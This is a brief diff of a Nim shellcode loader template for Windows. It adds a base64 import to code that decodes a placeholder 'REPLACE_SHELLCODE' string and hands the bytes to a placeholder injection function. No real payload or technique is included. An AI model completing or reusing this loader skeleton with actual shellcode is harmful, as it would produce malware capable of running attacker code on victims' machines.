@@ -1,3 +1,4 @@
+import base64
 import winim
 import winim/lean
 
@@ -9,7 +10,6 @@ when isMainModule:
     @(str.toOpenArrayByte(0, str.high))
  
   let enc = "REPLACE_SHELLCODE"
-
   let shellcode = toByteSeq(decode(enc))
   REPLACE_TECHNIQUE_NAME(shellcode)
 
